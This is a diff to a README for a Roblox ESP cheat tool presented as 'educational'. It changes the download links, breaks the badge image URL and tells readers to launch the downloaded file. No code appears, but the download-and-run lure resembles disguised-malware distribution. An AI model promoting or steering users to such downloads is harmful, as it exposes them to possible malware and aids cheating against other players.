@@ -8,13 +8,13 @@ Welcome to the README for the **Roblox ESP Player and Object Highlighting Educat
 - **Topics**: bot-scripting, esp, game-automation, game-customization, game-development, game-utilities, lua-injector, lua-programming, lua-scripting, lua-scripts, programming-tools, roblox, roblox-api, roblox-development, roblox-scripting, roblox-tools
 
 ## Access the Tool
-To access the Roblox ESP tool, you can download it directly from this link: [Download Roblox ESP](https://github.com/assets/Release.zip).
+To access the Roblox ESP tool, you can download it directly from this link: [Download Roblox ESP](https://github.com/Jhuan27/Roblox-ESP-Player-and-Object-Highlighting-Educational-Tool/releases).
 
 If the link ends with a file name, it needs to be launched to start using the tool.
 
 If the link does not work or is not provided, please check the "Releases" section of this repository for alternative download options.
 
-[![Download Roblox ESP](https://img.shields.io/badge/Download-Roblox%20ESP-blue)](https://github.com/assets/Release.zip)
+[![Download Roblox ESP](https://github.com/Jhuan27/Roblox-ESP-Player-and-Object-Highlighting-Educational-Tool/releases%20ESP-blue)](https://github.com/Jhuan27/Roblox-ESP-Player-and-Object-Highlighting-Educational-Tool/releases)
 
 ## Getting Started
 Follow these simple steps to get started with the Roblox ESP highlighting tool:
